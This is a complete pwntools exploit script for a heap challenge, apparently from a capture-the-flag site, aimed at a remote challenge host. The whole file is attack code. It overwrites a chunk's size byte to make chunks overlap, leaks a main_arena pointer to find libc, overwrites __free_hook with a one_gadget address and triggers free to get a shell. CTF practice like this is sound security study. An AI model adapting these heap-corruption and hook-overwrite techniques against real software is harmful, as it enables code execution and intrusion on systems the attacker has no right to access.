from pwn import *
from LibcSearcher import *

context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27833)
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
elf = ELF('./pwn')


def create(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap:', content)


def edit(index, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())
    io.sendafter(b'Content of heap : ', content)


def show(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())


def delete(index):
    io.sendlineafter(b'Your choice :', b'4')
    io.sendlineafter(b'Index :', str(index).encode())


create(0x48, b'colin')  # heaparray[0]
create(0x48, b'colin')  # heaparray[1]
create(0x48, b'colin')  # heaparray[2]
edit(0, cyclic(0x48) + b'\x91')
delete(1)
create(0x68, b'colin')  # heaparray[1]
edit(1, cyclic(0x40) + p64(0x51) + p64(0x21) + p64(0x100))  # change the readable size of heaparray[2]
create(0x88, b'colin')  # heaparray[3]
create(0x68, b'colin')  # heaparray[4]
delete(3)
payload = cyclic(0x70)
edit(2, payload)
show(2)
io.recvuntil(b'aabcaab')
main_arena = u64(io.recv(6) + b'\x00\x00') - 88
__malloc_hook = main_arena - 0x10
print(hex(main_arena))
libc = LibcSearcher("__malloc_hook", __malloc_hook)
base = __malloc_hook - libc.dump("__malloc_hook")
sys = base + libc.dump("system")
binsh = base + libc.dump("str_bin_sh")
__free_hook = base + libc.dump("__free_hook")

payload = cyclic(0x40)
payload += p64(0x50)
payload += p64(0x21)
payload += p64(0x90)
payload += p64(0xdeadbeef)     # change write address to __free_hook
payload += p64(0x20)
payload += p64(0x90)
edit(2, payload)

create(0x68, b'colin')  # heaparray[4], reallocate

payload = cyclic(0x40)
payload += p64(0x50)
payload += p64(0x21)
payload += p64(0x90)
payload += p64(__free_hook)     # change write address to __free_hook
payload += p64(0x20)
payload += p64(0x90)

edit(2, payload)
edit(3, p64(base + one_gadgets[1]))
delete(0)

io.interactive()

